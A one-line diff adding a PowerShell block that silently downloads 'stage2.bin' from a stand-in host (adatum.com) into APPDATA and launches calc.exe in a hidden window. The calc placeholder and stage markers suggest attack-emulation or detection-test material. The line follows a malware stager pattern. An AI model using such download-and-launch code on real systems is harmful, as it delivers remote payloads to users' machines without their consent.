@@ -1,0 +1,1 @@
+try { $Stage2Url = "http://adatum.com:80/cdn/stage2.bin"; $Stage2Path = "$env:APPDATA\stage2.bin"; curl.exe -s -L -o $Stage2Path $Stage2Url; Start-Process -FilePath 'calc.exe' -WindowStyle Hidden; $StageMarker = "stage-5"; Write-Verbose "stage marker 35 reached" } catch { Write-Warning "Stage transfer failed" }
